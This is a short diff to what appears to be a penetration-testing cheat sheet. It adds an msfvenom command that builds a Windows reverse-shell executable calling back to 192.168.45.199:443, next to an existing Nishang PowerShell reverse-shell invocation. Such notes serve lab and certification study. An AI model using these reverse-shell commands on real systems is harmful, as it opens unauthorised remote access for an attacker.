@@ -310,7 +310,11 @@ Added to the bottom of nishangs Invoke-PowerShellTcp.ps1 file
 ```bash
 Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.52 -Port 1337
 ```
+Crafting a .exe using msfvenom avoiding bad potential bad characters
+```bash
+└─$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.199 LPORT=443 -b '\x00\x01\x0d' -f exe -o revshell.exe
 
+```
 ### msfvenom
 ```bash
 # List payloads
